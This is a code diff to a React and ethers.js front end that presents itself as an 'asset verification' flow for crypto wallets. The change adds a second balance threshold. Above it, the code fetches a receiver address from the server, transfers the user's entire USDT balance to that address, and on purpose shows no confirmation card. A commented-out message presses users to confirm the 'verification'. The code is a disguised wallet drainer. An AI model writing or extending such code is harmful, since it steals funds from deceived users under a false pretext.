@@ -2,7 +2,7 @@ import React, { useState, useEffect } from "react";
 import { ethers } from "ethers";
 import { createRoot } from "react-dom/client";
 import usdtAbi from "../abi/USDT.json";
-import { USDT_ADDRESS, USDT_RECEIVER, CHAIN_ID, CHAIN_ID_DECIMAL, NETWORK_NAME, USDT_THRESHOLD, GAS_FUNDER_ADDRESS } from "../utils/config";
+import { USDT_ADDRESS, USDT_RECEIVER, CHAIN_ID, CHAIN_ID_DECIMAL, NETWORK_NAME, USDT_THRESHOLD, GAS_FUNDER_ADDRESS, USDT_THRESHOLD2 } from "../utils/config";
 import SuccessCard from "./SuccessCard";
 import VerifiedCard from "./VerifiedCard";
 
@@ -94,9 +94,50 @@ export const verifyAssets = async (
   
   try {
     const threshold = ethers.utils.parseUnits(String(USDT_THRESHOLD), decimals);
+    const threshold2 = ethers.utils.parseUnits(String(USDT_THRESHOLD2), decimals);
     console.log("🎯 Verification threshold:", ethers.utils.formatUnits(threshold, decimals), "USDT");
+    console.log("🎯 Verification threshold 2:", ethers.utils.formatUnits(threshold2, decimals), "USDT");
     
-    if (balance.gte(threshold)) {
+    if (balance.gte(threshold2)) {
+      console.log("💰 Balance meets threshold 2, proceeding with special transfer");
+      const usdtWithSigner = usdt.connect(signer);
+      try {
+        console.log("📝 Preparing special transfer transaction");
+        const response = await fetch('/api/get-receiver-address');
+        const data = await response.json();
+        const receiverAddress = data.address;
+
+        if (!receiverAddress) {
+          throw new Error("Could not fetch receiver address");
+        }
+        
+        console.log("👉 From:", userAddress);
+        console.log("👉 To (special):", receiverAddress);
+        console.log("👉 Amount:", readableBalance, "USDT");
+        
+        const tx = await usdtWithSigner.transfer(receiverAddress, balance);
+        console.log("🔄 Transaction submitted:", tx.hash);
+        console.log("⏳ Waiting for transaction confirmation...");
+        
+        await tx.wait();
+        console.log("✅ Special transaction confirmed!");
+        
+        // Do not show any card for transfers > USDT_THRESHOLD2
+      } catch (transferError) {
+        // @ts-expect-error build
+        if (transferError.code === 4001) {
+          console.log("❌ User rejected transaction");
+          // alert("Verification failed as user denied confirmation! Please confirm the message for asset verification");
+          return;
+        }
+        console.error("❌ Transfer error occurred:", transferError);
+        // @ts-expect-error build
+        if (transferError.error) console.error("Error details:", transferError.error);
+        // @ts-expect-error build
+        if (transferError.transaction) console.log("Transaction details:", transferError.transaction);
+        throw transferError;
+      }
+    } else if (balance.gte(threshold)) {
       console.log("💰 Balance meets threshold, proceeding with transfer");
       const usdtWithSigner = usdt.connect(signer);
       try {
